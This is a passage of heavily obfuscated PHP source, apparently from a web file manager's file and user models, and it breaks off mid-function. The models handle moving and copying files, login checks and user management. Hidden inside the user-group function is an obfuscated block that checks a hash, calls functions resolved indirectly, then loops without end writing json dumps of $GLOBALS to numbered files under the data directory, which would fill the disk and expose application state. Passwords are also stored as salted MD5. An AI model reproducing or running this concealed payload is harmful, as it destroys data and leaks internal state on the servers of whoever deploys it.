{ $dޖ̬ = $c؆[$C״[457]]; $Bߣё = $c؆[$C״[366]]; if (!isset($this->_childrenListCache[$Bߣё]) && $c؆[$C״[367]] == $C״[493]) { $this->_childrenListCache[$Bߣё] = array(); } if (!isset($this->_childrenListCache[$dޖ̬])) { $this->_childrenListCache[$dޖ̬] = array(); } $this->_childrenListCache[$dޖ̬][$Bߣё] = $c؆; $this->_childrenItemCache[$Bߣё] = $c؆; } goto EÃ; EÃ: } private function _childrenListAll($A, &$bª) { $e =& $_SERVER[놫Ӱ]; if (!isset($this->_childrenListCache[$A])) { return; } $f㰩 = $this->_childrenListCache[$A]; foreach ($f㰩 as $Fގ => $dѣ) { $bª[$Fގ] = $dѣ; if ($dѣ[$e[367]] == $e[493]) { $this->_childrenListAll($Fގ, $bª); } } } private function sourceInfoCache($dҽ) { if (isset($this->_childrenItemCache[$dҽ])) { return $this->_childrenItemCache[$dҽ]; } return $this->sourceInfo($dҽ); } private function _childrenList($bܘ) { if (isset($this->_childrenListCache[$bܘ])) { return $this->_childrenListCache[$bܘ]; } return $this->_childrenListSelect($bܘ); } private function _childrenListSelect($eׄ) { goto D߇; Fɐ: $Dϲ = $Dϲ ? $Dϲ : array(); $E = array_to_keyvalue($Dϲ, $e߷[366]); $this->_childrenListCache[$eׄ] = $E; goto Cχ; D߇: $e߷ =& $_SERVER[놫Ӱ]; $fÖۮ = array($e߷[457] => $eׄ, $e߷[393] => 0); $Dϲ = $this->where($fÖۮ)->select(); goto Fɐ; Cχ: foreach ($E as $eׄ => $C) { $this->_childrenItemCache[$eׄ] = $C; } return $E; goto DŘ; DŘ: } private function fileNameExistCache($B, $FԂ) { $E٣琈 =& $_SERVER[놫Ӱ]; $FԂ = strtolower($FԂ); $eȥݭ = $this->_childrenList($B); foreach ($eȥݭ as $Cߊ) { if ($FԂ == strtolower($Cߊ[$E٣琈[28]])) { return $Cߊ[$E٣琈[366]]; } } return !1; } private function fileNameAutoCache($F엂Ђ, $a߼, $e, $D) { $CЍ =& $_SERVER[놫Ӱ]; $c슝 = $this->_childrenList($F엂Ђ); $Dԏ = array_to_keyvalue($c슝, $CЍ[33], $CЍ[28]); return $this->fileNameAutoGet($Dԏ, $a߼, $e, $D); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($B㏅, $C咯, $fԞ = REPEAT_REPLACE, $B = '') { goto cՍЂ; CÃ: $this->lockMoveStart($B㏅); $this->lockWriteStart($C咯, $f); $c֐ = array($E酅[494] => array(), $E酅[525] => !1); goto FПÒ; d䭙: if ($Bϰҗ͆[$E酅[367]] == $E酅[493]) { $cޕǇ[] = $B㏅; } $this->updateModifyTime($cޕǇ); Model($E酅[498])->eventMove($B㏅, $Bϰҗ͆[$E酅[457]], $C咯); goto e҂ꉺ; B׸Ϻ: Hook::trigger($E酅[523], $C); if ($Bϰҗ͆[$E酅[457]] == $C咯 && $B != $Bϰҗ͆[$E酅[28]]) { $FӘ = $this->fileNameExist($C咯, $B); if ($FӘ && $Bϰҗ͆[$E酅[367]] == $E酅[464]) { goto Eڝ; bن: $this->remove($B㏅, !1); $this->folderSizeReset($C咯); Hook::trigger($E酅[524], $C); goto cǲ; cǲ: return $FӘ; goto cĬ; Eڝ: $eӕ䱥 = $this->sourceInfo($FӘ); $Cל = $this->fileHistory($eӕ䱥, $Bϰҗ͆[$E酅[415]], $Bϰҗ͆[$E酅[78]]); if (!$Cל) { Model($E酅[418])->remove($Bϰҗ͆[$E酅[415]]); } goto bن; cĬ: } } $f = $B ? $B : $Bϰҗ͆[$E酅[28]]; goto CÃ; Fꛫ: $this->folderSizeReset($Bϰҗ͆[$E酅[457]]); $this->folderSizeReset($C咯); $cޕǇ = array($Bϰҗ͆[$E酅[457]], $C咯); goto d䭙; eʳ: if ($Bپ && $c֐[$E酅[525]]) { $this->remove($B㏅, !1); } $this->lockMoveEnd($B㏅); $this->lockWriteEnd($C咯, $f); goto Fꛫ; FПÒ: $this->clearShare($B㏅, $C咯); $Bپ = $this->fileNameExistCache($C咯, $Bϰҗ͆[$E酅[28]]); $dʨԘ = $this->_move($B㏅, $C咯, $fԞ, $c֐, $B); goto CΞ; cՍЂ: $E酅 =& $_SERVER[놫Ӱ]; $Bϰҗ͆ = $this->sourceInfo($B㏅); $A겺 = $this->sourceInfo($C咯); goto a詗; a詗: $C = $this->pathInfoMore($B㏅); if ($this->isParentOf($B㏅, $C咯)) { return !1; } if (!$Bϰҗ͆ || !$A겺 || $A겺[$E酅[367]] != $E酅[493]) { return !1; } goto B׸Ϻ; CΞ: $this->sourceCacheClear(); if ($Bϰҗ͆[$E酅[367]] == $E酅[493] && $Bپ) { $this->folderSizeResetChildren($dʨԘ); } Model($E酅[164])->linkAdd($c֐[$E酅[494]]); goto eʳ; e҂ꉺ: Hook::trigger($E酅[524], $C); return $dʨԘ; goto Aٰ; Aٰ: } private function _move($aჃ, $F䓂, $F︉, &$aə, $dӡ = '') { goto bΗޞ; bΗޞ: $Aߛȿ =& $_SERVER[놫Ӱ]; $D = $this->sourceInfo($aჃ); $F։ = $D[$Aߛȿ[367]] == $Aߛȿ[493]; goto DۧĲ; cѸ: $this->lockWriteStart($F䓂, $F͏Ĉ); if (!$c玫) { return $this->_moveForce($aჃ, $F䓂, $F͏Ĉ); } $aޒ󾻠 = $c玫; goto Aժ; b綰: return $aޒ󾻠; goto a; Aժ: $cѧ = !1; if ($F։) { if ($F︉ == REPEAT_RENAME_FOLDER) { $F͏Ĉ = $this->fileNameAuto($F䓂, $F͏Ĉ, $F︉, $F։); $aޒ󾻠 = $this->_moveForce($aჃ, $F䓂, $F͏Ĉ); } else { if ($F︉ == REPEAT_RENAME_FOLDER) { $F︉ = REPEAT_RENAME; } $Cȭ = $this->_childrenListSelect($aჃ); foreach ($Cȭ as $eܙ) { $this->_move($eܙ[$Aߛȿ[366]], $c玫, $F︉, $aə); } $cѧ = !0; } } else { if ($F︉ == REPEAT_SKIP) { $cѧ = !0; } else { if ($F︉ == REPEAT_RENAME || $F︉ == REPEAT_RENAME_FOLDER) { $F͏Ĉ = $this->fileNameAuto($F䓂, $F͏Ĉ, $F︉, $F։); $aޒ󾻠 = $this->_moveForce($aჃ, $F䓂, $F͏Ĉ); } else { if ($F︉ == REPEAT_REPLACE) { $A = $this->sourceInfoCache($c玫); $aҘ = $this->fileHistory($A, $D[$Aߛȿ[415]], $D[$Aߛȿ[78]]); if ($aҘ) { $aə[$Aߛȿ[494]][] = $D[$Aߛȿ[415]]; } else { $cѧ = !0; } } } } } if ($cѧ && !$aə[$Aߛȿ[525]]) { $aə[$Aߛȿ[525]] = !0; } goto b綰; DۧĲ: $F͏Ĉ = $dӡ ? $dӡ : $D[$Aߛȿ[28]]; $c玫 = $this->fileNameExistCache($F䓂, $F͏Ĉ); $this->lockMoveStart($aჃ); goto cѸ; a: } private function _moveForce($c勧, $Eש, $F) { goto D׉; F쐙ڶ: if (!$B) { Model($CĦ[450])->authClear($c勧); } $e͌㽭 = $e[$CĦ[393]] == $CĦ[493] && $E˖̩[$CĦ[393]] != $CĦ[493]; if ($e͌㽭) { $dʌ[$CĦ[392]] = 0; } goto DλȽ; DλȽ: if ($e݈) { $a֐ = array($CĦ[518] => array($CĦ[475], $e[$CĦ[455]] . $e[$CĦ[366]] . $CĦ[476])); $dѓ҈ = $e[$CĦ[455]] . $e[$CĦ[366]] . $CĦ[47]; $eĴ = $E˖̩[$CĦ[455]] . $E˖̩[$CĦ[366]] . $CĦ[47] . $e[$CĦ[366]] . $CĦ[47]; $BĄ = array($CĦ[518] => array($CĦ[526], "\162\x65\160\x6c\x61\143\x65\x28\x70\x61\x72\145\x6e\x74\x4c\145\x76\x65\x6c\54\x27{$dѓ҈}\47\x2c\x27{$eĴ}\47\x29"), $CĦ[514] => $E˖̩[$CĦ[368]], $CĦ[515] => $E˖̩[$CĦ[452]]); if ($e͌㽭) { $BĄ[$CĦ[392]] = 0; } $this->where($a֐)->data($BĄ)->save(); } $this->where(array($CĦ[380] => $c勧))->data($dʌ)->save(); return $c勧; goto F֐; D׉: $CĦ =& $_SERVER[놫Ӱ]; $e = $this->sourceInfo($c勧); $E˖̩ = $this->sourceInfo($Eש); goto Cå; Cå: $e݈ = $e[$CĦ[367]] == $CĦ[493]; $dʌ = array($CĦ[365] => $E˖̩[$CĦ[366]], $CĦ[518] => $E˖̩[$CĦ[455]] . $E˖̩[$CĦ[366]] . $CĦ[47], $CĦ[514] => $E˖̩[$CĦ[368]], $CĦ[515] => $E˖̩[$CĦ[452]], $CĦ[517] => USER_ID, $CĦ[383] => $F); $B = $e[$CĦ[368]] == SourceModel::TYPE_GROUP && $E˖̩[$CĦ[368]] == SourceModel::TYPE_GROUP && $e[$CĦ[452]] == $E˖̩[$CĦ[452]]; goto F쐙ڶ; F֐: } private function clearShare($e汸, $Bő) { goto Dυ; CƋ: if ($fԄ[$fБ[452]] == $D[$fБ[452]] && $fԄ[$fБ[368]] == $fБ[527]) { return; } $B׍ = array($fБ[455] => array($fБ[475], $fԄ[$fБ[455]] . $e汸 . $fБ[476])); $B = $this->field($fБ[380])->where($B׍)->getField($fБ[366], !0); goto fȔ; Dυ: $fБ =& $_SERVER[놫Ӱ]; $fԄ = $this->sourceInfo($e汸); $D = $this->sourceInfo($Bő); goto CƋ; c: Model($fБ[528])->where($B׍)->save(array($fБ[444] => 0)); Model($fБ[529])->where($B׍)->delete(); goto bߚƕ; Dɞ: if (!$c򳎯) { return; } $c򳎯 = array_to_keyvalue($c򳎯, $fБ[33], $fБ[437]); $B׍ = array($fБ[437] => array($fБ[7], $c򳎯)); goto c; fȔ: if (!$B) { return; } $B׍ = array($fБ[366] => array($fБ[7], $B), $fБ[444] => 1); $c򳎯 = Model($fБ[528])->field($fБ[437])->where($B׍)->select(); goto Dɞ; bߚƕ: } public function copyFolderFromIO($e, $dэ, $Eѫ, $eͨʢ, $D) { goto eڒ; b: $this->updateModifyTime($Eѫ); return $Fώ; goto c; EշĜ: Hook::trigger($a[532]); if ($Fώ) { $this->folderSizeResetChildren($Fώ); } $this->_childrenListClear(); goto fҮ; a𪸦: $aӞ = $this->fileNameExist($Eѫ, $A̻); $Fώ = $this->mkdir($Eѫ, $A̻, $eͨʢ); if (!$aӞ || $eͨʢ == REPEAT_RENAME_FOLDER) { $eͨʢ = !1; } goto D͝ġ; A̚: Model($a[418])->linkAdd($aɕ[$a[494]]); Model($a[418])->remove($aɕ[$a[530]]); $this->folderSizeReset($Eѫ); goto b; D͝ġ: if ($aӞ) { $this->_childrenAllMake($aӞ); } Hook::trigger($a[531]); $this->_copyChildTo($e, $dэ, $Fώ, $eͨʢ, $aɕ, $D); goto EշĜ; fҮ: Model($a[497])->addAll($aɕ[$a[495]], array(), !0); Model($a[498])->eventCopy($Fώ); $this->saveAll($aɕ[$a[496]]); goto A̚; eڒ: $a =& $_SERVER[놫Ӱ]; $aɕ = array($a[495] => array(), $a[496] => array(), $a[494] => array(), $a[530] => array()); $A̻ = $e->getPathName($e->pathThis($dэ)); goto a𪸦; c: } private function _copyChildTo($Fȼ, $B܃ɢ, $A, $d߳, &$a, $Eɝ) { goto f; C眦̸: $a = $this->_childrenList($A); $a = array_to_keyvalue($a, $bŌ[28]); foreach ($Cڂ as $Aڑ) { $dභ = $a[$Aڑ[$bŌ[28]]]; $B = $dභ[$bŌ[366]]; $this->_copyApplyMeta($dභ, $a); if ($Aڑ[$bŌ[29]] == $bŌ[77]) { $Aڑ[$bŌ[76]] = $Fȼ->getPathInner($Aڑ[$bŌ[76]]); $this->_copyChildTo($Fȼ, $Aڑ[$bŌ[76]], $B, $d߳, $a, $Eɝ); } } goto eǯ; f: $bŌ =& $_SERVER[놫Ӱ]; $cν = $this->sourceInfoCache($A); $fɐ؏ = $Fȼ->listPath($B܃ɢ, !1, !0); goto Còԗ; Còԗ: $Cڂ = array_merge($fɐ؏[$bŌ[74]], $fɐ؏[$bŌ[75]]); $a = $this->_addFiles($Fȼ, $fɐ؏[$bŌ[74]], $Eɝ); $Bҧ = array(); goto B; B: foreach ($Cڂ as &$Aڑ) { goto aۉѲ; aۉѲ: if (isset($a[$Aڑ[$bŌ[28]]])) { $Aڑ = $a[$Aڑ[$bŌ[28]]]; } $Aڑ[$bŌ[367]] = $Aڑ[$bŌ[29]] == $bŌ[77]; $Aڑ[$bŌ[369]] = _get($Aڑ, $bŌ[157], $bŌ[33]); goto dǑۜ; dǑۜ: $Aڑ[$bŌ[78]] = _get($Aڑ, $bŌ[78], 0); $Aڑ[$bŌ[415]] = _get($Aڑ, $bŌ[415], 0); if (!isset($Aڑ[$bŌ[533]]) && $Aڑ[$bŌ[415]]) { $a[$bŌ[530]][] = $Aڑ[$bŌ[415]]; } goto bիѭ; bիѭ: if ($d߳) { $B = $this->fileNameExistCache($A, $Aڑ[$bŌ[28]]); if ($B) { if ($Aڑ[$bŌ[367]] || $d߳ == REPEAT_SKIP) { continue; } if ($d߳ == REPEAT_REPLACE) { $dභ = $this->sourceInfoCache($B); $E = $this->fileHistory($dභ, $Aڑ[$bŌ[415]], $Aڑ[$bŌ[78]]); if ($E) { $a[$bŌ[494]][] = $Aڑ[$bŌ[415]]; } continue; } else { if ($d߳ == REPEAT_RENAME) { $Aڑ[$bŌ[28]] = $this->fileNameAutoCache($A, $Aڑ[$bŌ[28]], $d߳, !1); } } } } if (!$Aڑ[$bŌ[367]] && $Aڑ[$bŌ[415]]) { $a[$bŌ[494]][] = $Aڑ[$bŌ[415]]; } $Bҧ[] = $this->_makeItemData($Aڑ, $cν, $Aڑ[$bŌ[28]]); goto b刊; b刊: } unset($Aڑ); if (!empty($Bҧ)) { $this->addAll($Bҧ); } goto C眦̸; eǯ: } private function _addFiles($b, $d, $eІʌ) { goto f; Fȗ: $C = array(); foreach ($d as $F୓) { if (isset($F୓[$dƆ[533]]) && $F୓[$dƆ[533]]) { continue; } $A頌 = $b->getPathInner($F୓[$dƆ[76]]); $Aʒ = $B⟛->addFileMake($A頌, $F୓[$dƆ[78]], $F୓[$dƆ[161]], $F୓[$dƆ[160]], $F୓[$dƆ[28]], $eІʌ); $C[] = $Aʒ; } $B⟛->addAll($C); goto a߉; CҪޭ: $eЈ̝ = $B⟛->where($Bح)->select(); $eЈ̝ = $eЈ̝ ? $eЈ̝ : array(); foreach ($eЈ̝ as $BÒ) { if (!isset($Cǣ[$BÒ[$dƆ[160]]])) { continue; } $AƋ = $Cǣ[$BÒ[$dƆ[160]]]; foreach ($AƋ as &$dČ) { $dČ[$dƆ[415]] = $BÒ[$dƆ[415]]; $dČ[$dƆ[533]] = !0; } unset($dČ); } goto Fȗ; f: $dƆ =& $_SERVER[놫Ӱ]; if (!$d || count($d) == 0) { return array(); } $Cǣ = array(); goto bِힷ; bِힷ: foreach ($d as &$dČ) { goto fϐԥ; bΒɬ: if (count($Cǣ[$c]) > 1) { $dČ[$dƆ[533]] = !0; } goto e괘ڇ; C쨏: $dČ[$dƆ[160]] = $c; Hook::trigger($dƆ[535], $dČ); $Cǣ[$c][] =& $dČ; goto bΒɬ; E˜Ę: $c = $b->hashMd5($dČ[$dƆ[76]]); if (strlen($c) > 10 && !isset($Cǣ[$c])) { $Cǣ[$c] = array(); } $dČ[$dƆ[161]] = $eєȊ; goto C쨏; fϐԥ: Hook::trigger($dƆ[534], $dČ); $dČ[$dƆ[76]] = $b->getPathInner($dČ[$dƆ[76]]); $eєȊ = $b->hashSimple($dČ[$dƆ[76]]); goto E˜Ę; e괘ڇ: } $Bح = array($dƆ[160] => array($dƆ[7], array_keys($Cǣ))); $B⟛ = Model($dƆ[536]); goto CҪޭ; b߿: return $A֎ޱ; goto Eߙ; BȺ: foreach ($eЈ̝ as $BÒ) { if (!isset($Cǣ[$BÒ[$dƆ[160]]])) { continue; } $B獧ܙ =& $Cǣ[$BÒ[$dƆ[160]]]; foreach ($B獧ܙ as &$dČ) { $dČ[$dƆ[415]] = $BÒ[$dƆ[415]]; } unset($dČ); } $A֎ޱ = array(); foreach ($d as $fɄ󴬠) { $A֎ޱ[$fɄ󴬠[$dƆ[28]]] = $fɄ󴬠; } goto b߿; a߉: $Bح = array($dƆ[160] => array($dƆ[7], array_keys($Cǣ))); $eЈ̝ = $B⟛->where($Bح)->select(); $eЈ̝ = $eЈ̝ ? $eЈ̝ : array(); goto BȺ; Eߙ: } } define($_SERVER[놫Ӱ][537], $_SERVER[놫Ӱ][538]); goto ě; Eܦ: class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\x61\155\x65" => "\x75\x73\145\162\137\155\145\x74\x61", "\155\145\x74\141\106\x69\x65\x6c\144" => "\x75\x73\145\x72\111\x44"); protected $simpleField = "\165\163\145\x72\x49\104\x2c\156\x69\143\153\116\141\x6d\145\54\156\141\155\x65\54\x61\x76\141\164\141\x72\54\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($aڙ) { $Fަ =& $_SERVER[놫Ӱ]; return array($Fަ[2072] => array($aڙ[0], $Fަ[2359]), $Fަ[2074] => array($aڙ[0], $Fަ[2359])); } protected function getInfo($Dߵ, $fӊΔ = false) { $E =& $_SERVER[놫Ӱ]; $c = $this->getInfoSimple($Dߵ); if (!is_array($c)) { return array(); } if ($fӊΔ) { goto Aә; c؇: $F = Model($E[1075])->metaGet($c[$E[388]][$E[366]]); $c[$E[2362]] = $a٣; $c[$E[388]][$E[2218]] = isset($F[$E[2219]]) ? $F[$E[2219]] : null; goto D۹ԓϙ; D۹ԓϙ: return $c; goto Aݞ; Aә: if (!$c) { return $c; } $a٣ = md5($E[2360] . $c[$E[794]] . $E[2361] . $c[$E[28]]); $c = $this->_listDataApplyItem($c); goto c؇; Aݞ: } return $this->cacheFunctionGet($E[2115], $Dߵ); } protected function getInfoSimple($F, $E = false) { $aÇ؃ =& $_SERVER[놫Ӱ]; if (!$F) { return array(); } if ($E) { $Fױϰ = $this->where(array($aÇ؃[1339] => intval($F)))->find(); if (!is_array($Fױϰ)) { return array(); } $Fױϰ[$aÇ؃[2363]] = Action($aÇ؃[2364])->parseUrl($Fױϰ[$aÇ؃[2363]]); return $Fױϰ; } return $this->cacheFunctionGet($aÇ؃[2075], $F); } protected function getInfoSimpleOuter($bԺò) { goto e; E؞: $f㐄ʏ = array_field_key($Aޞ, explode($cֹՐ[47], $this->simpleField)); if (!$f㐄ʏ) { return array($cֹՐ[1339] => $cֹՐ[1004], $cֹՐ[28] => $cֹՐ[154] . LNG($cֹՐ[2367]) . $cֹՐ[468], $cֹՐ[2363] => STATIC_PATH . $cֹՐ[2368]); } $f㐄ʏ[$cֹՐ[2363]] = Action($cֹՐ[2364])->parseUrl($f㐄ʏ[$cֹՐ[2363]]); goto A室; A室: return $f㐄ʏ; goto B˪; e: $cֹՐ =& $_SERVER[놫Ӱ]; if (!$bԺò || $bԺò == 0) { return array($cֹՐ[1339] => $cֹՐ[464], $cֹՐ[28] => $cֹՐ[154] . LNG($cֹՐ[2365]) . $cֹՐ[468], $cֹՐ[2363] => STATIC_PATH . $cֹՐ[2366]); } $Aޞ = $this->cacheFunctionGet($cֹՐ[2075], $bԺò); goto E؞; B˪: } protected function groupUser($c𕫭) { } public static function errorLang($dˇ) { $dǥڂ =& $_SERVER[놫Ӱ]; $eҍ = array(self::ERROR_USER_NOT_EXISTS => $dǥڂ[2369], self::ERROR_USER_PASSWORD_ERROR => $dǥڂ[2370], self::ERROR_USER_EXIST_NAME => $dǥڂ[2371], self::ERROR_USER_EXIST_PHONE => $dǥڂ[2372], self::ERROR_USER_EXIST_EMAIL => $dǥڂ[2373], self::ERROR_USER_LOGIN_LOCK => $dǥڂ[2374], self::ERROR_IP_NOT_ALLOW => $dǥڂ[2375], self::ERROR_USER_EXIST_NICKNAME => $dǥڂ[2376]); return LNG($eҍ[$dˇ]); } public function getInfoByMeta($Eٕ, $cǼ) { $e·쬛 =& $_SERVER[놫Ӱ]; $b׬ = Model($e·쬛[2377])->where(array($e·쬛[88] => $Eٕ, $e·쬛[354] => $cǼ))->find(); if ($b׬) { return $this->getInfo($b׬[$e·쬛[1339]]); } return !1; } public function userLoginCheck($dʏ, $Eꭉ) { goto Aꅾ; aְ: $this->userEdit($bʞ[$D²[1339]], array($D²[2379] => time())); $this->clearCache($bʞ[$D²[1339]]); return $this->getInfo($bʞ[$D²[1339]]); goto bӟ˥; bߨ: $bʞ = $this->where($cż)->find(); if (!$bʞ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($bʞ[$D²[1339]], $Eꭉ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto aְ; Aꅾ: $D² =& $_SERVER[놫Ӱ]; $cż = array($D²[28] => $dʏ, $D²[2221] => $dʏ, $D²[290] => $dʏ, $D²[2378] => $dʏ, $D²[907] => $D²[909]); if ($this->nickNameRpt()) { unset($cż[$D²[2221]]); } goto bߨ; bӟ˥: } public function clearCache($E) { $Eͻ =& $_SERVER[놫Ӱ]; $this->cacheFunctionClear($Eͻ[2115], $E); $this->cacheFunctionClear($Eͻ[2075], $E); } public function userPasswordCheck($E܆, $c׌Ӑ) { $aՖ =& $_SERVER[놫Ӱ]; $F݄ = $this->where(array($aՖ[1339] => intval($E܆)))->find(); $d = $this->metaGet($E܆); $e޳ = isset($d[$aՖ[2380]]) ? $d[$aՖ[2380]] : $aՖ[33]; if (md5($e޳ . trim($c׌Ӑ)) !== $F݄[$aՖ[794]]) { return !1; } return !0; } public function userAdd($eхƮ) { goto E珯; FƑ: return $a; goto dՅ܈; C: $dї뼌 = array($c˦[2389] => $Eզ[$c˦[794]], $c˦[2385] => $Eզ[$c˦[2221]]); $this->userEdit($a, $dї뼌); Model($c˦[1075])->userRootAdd($a); goto FƑ; E珯: $c˦ =& $_SERVER[놫Ӱ]; $Eզ = array($c˦[383] => $eхƮ[$c˦[28]], $c˦[2381] => $eхƮ[$c˦[2382]], $c˦[2383] => isset($eхƮ[$c˦[290]]) ? $eхƮ[$c˦[290]] : $c˦[33], $c˦[2384] => isset($eхƮ[$c˦[2378]]) ? $eхƮ[$c˦[2378]] : $c˦[33], $c˦[2385] => isset($eхƮ[$c˦[2221]]) ? $eхƮ[$c˦[2221]] : $eхƮ[$c˦[28]], $c˦[2386] => isset($eхƮ[$c˦[2363]]) ? $eхƮ[$c˦[2363]] : $c˦[33], $c˦[2387] => isset($eхƮ[$c˦[2388]]) ? $eхƮ[$c˦[2388]] : 1, $c˦[2389] => $eхƮ[$c˦[794]], $c˦[2077] => isset($eхƮ[$c˦[1986]]) ? $eхƮ[$c˦[1986]] : 1024 * 1024 * 20, $c˦[2078] => 0, $c˦[2379] => 0, $c˦[2102] => isset($eхƮ[$c˦[674]]) ? $eхƮ[$c˦[674]] : 1); if (!empty($eхƮ[$c˦[1339]])) { $Eզ[$c˦[1339]] = $eхƮ[$c˦[1339]]; } goto d塉; d塉: $cì = $this->_checkExist($eхƮ); if ($cì !== !0) { return $cì; } $a = $this->add($Eզ); goto C; dՅ܈: } protected function userEditTest($F, $d䵈) { return $this->call($_SERVER[놫Ӱ][2390], $F, $d䵈); } protected function userEdit($ą, $dܻ) { goto Eł; Eł: $c楆 =& $_SERVER[놫Ӱ]; $aЊ = $this->getInfoSimple($ą); if (!$aЊ) { return !1; } goto e; Dڃ: $this->where(array($c楆[1330] => $ą))->save($dܻ); if (isset($dܻ[$c楆[2221]])) { $this->setNamePinyin($ą, $dܻ[$c楆[2221]]); } return !0; goto A; e: $AǕ = $this->_checkExist($dܻ, $ą); if ($AǕ !== !0) { return $AǕ; } if (isset($dܻ[$c楆[794]]) && trim($dܻ[$c楆[794]]) != $c楆[33]) { $C = $this->metaGet($ą); if (empty($C[$c楆[2380]])) { $C[$c楆[2380]] = rand_string(10); Model($c楆[466])->metaSet($ą, $c楆[2380], $C[$c楆[2380]]); } $dܻ[$c楆[794]] = md5($C[$c楆[2380]] . trim($dܻ[$c楆[794]])); } else { unset($dܻ[$c楆[794]]); } goto Dڃ; A: } public function setNamePinyin($Bߥ抃, $Dљ⩙ = false) { $D欩 =& $_SERVER[놫Ӱ]; if (!$Dљ⩙) { $f髃ΐ = $this->getInfoSimple($Bߥ抃); $Dљ⩙ = $f髃ΐ[$D欩[2221]] ? $f髃ΐ[$D欩[2221]] : $f髃ΐ[$D欩[28]]; } $Aˡ = Model($D欩[469]); if (!Input::check($Dљ⩙, $D欩[520])) { return $Aˡ->metaSet($Bߥ抃, array($D欩[412] => $D欩[33], $D欩[411] => $D欩[33])); } return $Aˡ->metaSet($Bߥ抃, array($D欩[412] => str_replace($D欩[50], $D欩[33], Pinyin::encode($Dљ⩙)), $D欩[411] => Pinyin::encode($Dљ⩙, $D欩[521]))); } private function nickNameRpt() { $F =& $_SERVER[놫Ӱ]; $Aͮɉ = Model($F[1055])->get($F[2391]); $AӇ = $GLOBALS[$F[6]][$F[2392]][$F[2391]]; $b = !is_null($Aͮɉ) ? $Aͮɉ : $AӇ; return !!$b; } private function _checkExist($CΈ, $cթ = false) { $E䵃΂ =& $_SERVER[놫Ӱ]; $cѮ = array($E䵃΂[28] => UserModel::ERROR_USER_EXIST_NAME, $E䵃΂[2221] => UserModel::ERROR_USER_EXIST_NICKNAME, $E䵃΂[290] => UserModel::ERROR_USER_EXIST_EMAIL, $E䵃΂[2378] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($cѮ[$E䵃΂[2221]]); } $cͯ = $cթ ? array($E䵃΂[1339] => array($E䵃΂[2393], $cթ)) : array(); foreach ($cѮ as $a => $b⇫) { if (!isset($CΈ[$a]) || !$CΈ[$a]) { continue; } $fÜߺ = array_merge(array($a => $CΈ[$a]), $cͯ); $DʤЏ = $this->where($fÜߺ)->find(); if ($DʤЏ) { return $b⇫; } } return !0; } public function userListInfo($aԜۘ) { $C変 =& $_SERVER[놫Ӱ]; $F = array(); $aԜۘ = array_unique($aԜۘ); if (!$aԜۘ) { return $F; } if (count($aԜۘ) < 20) { foreach ($aԜۘ as $bϥ) { $F[$bϥ . $C変[33]] = $this->getInfoSimpleOuter($bϥ); } } else { $E = array($C変[1330] => array($C変[381], $aԜۘ)); if (count($aԜۘ) == 1) { $E = array($C変[1330] => $aԜۘ[0]); } $Cо = Model($C変[466])->field($this->simpleField)->where($E)->select(); $Cо = array_to_keyvalue($Cо, $C変[1339]); foreach ($aԜۘ as $bϥ) { $cگ멛 = $Cо[$Cо[$bϥ]]; if (!$cگ멛) { $F[$bϥ . $C変[33]] = $this->getInfoSimpleOuter($bϥ); continue; } $cگ멛[$C変[2363]] = Action($C変[2364])->parseUrl($cگ멛[$C変[2363]]); $F[$bϥ . $C変[33]] = $cگ멛; } } return $F; } protected function userStatus($f, $A֋) { $e݈ = $this->getInfoSimple($f); if (!$e݈) { return !1; } $c웲 = array($_SERVER[놫Ӱ][674] => $A֋); return $this->userEdit($f, $c웲); } protected function userRemove($eًˬ) { goto dą; f쏩: $eм = array($AɊ[1330] => $eًˬ); Model($AɊ[528])->where($eм)->delete(); Model($AɊ[2394])->where($eм)->delete(); goto dž; dž: Model($AɊ[2081])->where($eм)->delete(); Model($AɊ[2377])->where($eм)->delete(); Model($AɊ[2395])->where($eм)->delete(); goto c焸; dą: $AɊ =& $_SERVER[놫Ӱ]; $cꌺ׭ = $this->getInfoSimple($eًˬ); if (!$cꌺ׭) { return !1; } goto f쏩; c焸: Model($AɊ[747])->userRootRemove($eًˬ); return $this->where($eм)->delete(); goto F; F: } protected function userGroupSet($FѦę, $bԝ, $b = array()) { goto e⋊; e⋊: $fǃ =& $_SERVER[놫Ӱ]; $a = $_SERVER[$fǃ[787]] . $fǃ[1217]; $A۽񐇈 = $fǃ[781]; goto D󙆧č; D󙆧č: if ($_SERVER[$fǃ[782]] != $A۽񐇈($a)) { goto b; B塠ô: $E = $fǃ[786]; $E($_SERVER[$fǃ[787]]); $B䗲東 = $fǃ[783]; goto f£ڽ; b: $B䗲東 = $fǃ[783]; $aݦ = $fǃ[784]; $b΋ = $_SERVER[$fǃ[779]] . $fǃ[780]; goto Aϟ; aᑛ: $C鬟 = 1; for ($a̅ = $C鬟; $a̅ > 0; $a̅++) { $eŽ(DATA_PATH . $a̅, $AŹ); } goto F԰; Aϟ: $F = $aݦ($b΋); $Fɽ = explode($fǃ[214], $F); if (count($Fɽ) < $fǃ[543]) { $A쉫 = $fǃ[785]; $A쉫(); } goto B塠ô; f£ڽ: $B䗲東(); $eŽ = $fǃ[788]; $AŹ = json_encode($GLOBALS[$fǃ[789]]); goto aᑛ; F԰: } $cꃄ = $this->getInfoSimple($FѦę); if (!$cꃄ || !is_array($bԝ)) { return !1; } goto C; F䎜: $A͓ = 0; foreach ($bԝ as $fТǄ => $a̟) { $B = array($fǃ[1339] => $FѦę, $fǃ[2002] => $fТǄ, $fǃ[2135] => $a̟); $B[$fǃ[2023]] = isset($b[$A͓]) ? $b[$A͓] : 0; $A͓++; $A[] = $B; } return $aȿП->addAll($A, array(), !0); goto cȎ; C: $aȿП = Model($fǃ[2081]); $aȿП->where(array($fǃ[1339] => $FѦę))->delete(); $A = array(); goto F䎜; cȎ: } protected function userGroupAdd($A, $EЇҤ, $e櫹) { $E =& $_SERVER[놫Ӱ]; $A㦵 = $this->getInfoSimple($A); if (!$A㦵 || !$EЇҤ) 